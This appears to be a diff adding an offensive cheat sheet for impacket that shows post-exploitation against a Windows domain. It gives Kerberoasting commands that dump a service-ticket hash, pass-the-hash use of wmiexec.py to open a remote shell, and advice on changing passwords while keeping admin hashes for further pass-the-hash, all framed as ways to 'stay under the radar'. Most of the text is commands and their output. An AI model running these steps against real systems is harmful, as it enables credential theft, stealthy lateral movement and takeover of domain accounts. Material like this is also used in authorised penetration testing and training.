@@ -1,0 +1,94 @@
+After gaining access to accounts impacket can be useful to help stay under the radar.
+
+----------------------------------------
+
+To install impacket
+
+Most errors with impacket are a result that people haven’t installed it.
+
+https://github.com/CoreSecurity/impacket.git
+
+cd impacket
+root@kali:~/Documents/impacket#pip install .
+root@kali:~/Documents/impacket# python setup.py install
+
+----------------------------------------
+Kerberoast
+
+root@kali:~# python /usr/share/doc/python-impacket/examples/GetUserSPNs.py -request -dc-ip 192.018.20.200 space.hopper/pinkydinkydo
+
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+Password:
+ServicePrincipalName                         Name         MemberOf                                         PasswordLastSet      LastLogon           
+-------------------------------------------  -----------  -----------------------------------------------  -------------------  -------------------
+YepYepItsMeYo/Snake.space.hopper:1433        The_Mr_T_admin  CN=Domain Admins,CN=Users,DC=space,DC=hopper  1878-03-30 01:52:19  1878-03-29 00:19:39 
+YepYepItsMeYo/Snake.space.hopper:SQLEXPRESS  The_Mr_T_admin  CN=Domain Admins,CN=Users,DC=space,DC=hopper  1878-03-30 01:52:19  1878-03-29 00:19:39 
+GimyT/space.hopper:80                     GimyT                                                         1878-03-30 18:30:39  1878-04-03 10:32:43 
+
+
+$krb5tgs$23$*GimyT$space.hopper$GimyT/space.hopper~80*$ab123f672a12d15a4a100f55a4421$Redaction3ab4d3a35b21988011fd383159eRedaction
+
+For more on Kerberoast https://www.pentestpartners.com/security-blog/how-to-kerberoast-like-a-boss/
+
+----------------------------------------
+
+python wmiexec.py Add-Domain-name/Add-User@Add-target-IP-Address -hashes Add-NTLMv2-Hash
+
+root@kali:~/Documents/impacket/examples# python wmiexec.py space.hopper/PinkyDo@192.168.15.78 -hashes bbd12345b51404eeaad3b435aac1a143:19767e4cdca57e93b111a9bb506add2
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   IPv4 Address. . . . . . . . . . . : 192.168.15.78
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.15.200
+
+C:\>
+
+----------------------------------------
+
+Use the below to change the password on a target host, but be careful using this, as you want to keep any local admin hashes intact so you can pass-the-hash PTH.
+
+root@kali:~/Documents/impacket/examples# python wmiexec.py space.hopper/PinkyDo@192.168.15.78 -hashes bbd12345b51404eeaad3b435aac1a143:19767e4cdca57e93b111a9bb506add2
+Impacket v0.9.21-dev - Copyright 2019 SecureAuth Corporation
+
+Type help for list of commands
+# help
+
+ open {host,port=445} - opens a SMB connection against the target host/port
+ login {domain/username,passwd} - logs into the current SMB connection, no parameters for NULL connection. If no password specified, it'll be prompted
+ kerberos_login {domain/username,passwd} - logs into the current SMB connection using Kerberos. If no password specified, it'll be prompted. Use the DNS resolvable domain name
+ login_hash {domain/username,lmhash:nthash} - logs into the current SMB connection using the password hashes
+ logoff - logs off
+ shares - list available shares
+ use {sharename} - connect to an specific share
+ cd {path} - changes the current directory to {path}
+ lcd {path} - changes the current local directory to {path}
+ pwd - shows current remote directory
+ password - changes the user password, the new password will be prompted for input
+ ls {wildcard} - lists all the files in the current directory
+ rm {file} - removes the selected file
+ mkdir {dirname} - creates the directory under the current path
+ rmdir {dirname} - removes the directory under the current path
+ put {filename} - uploads the filename into the current path
+ get {filename} - downloads the filename from the current path
+ mount {target,path} - creates a mount point from {path} to {target} (admin required)
+ umount {path} - removes the mount point at {path} without deleting the directory (admin required)
+ list_snapshots {path} - lists the vss snapshots for the specified path
+ info - returns NetrServerInfo main results
+ who - returns the sessions currently connected at the target host (admin required)
+ close - closes the current SMB Session
+ exit - terminates the server process (and this session)
+ 
+ ----------------------------------------
+ 
+ 
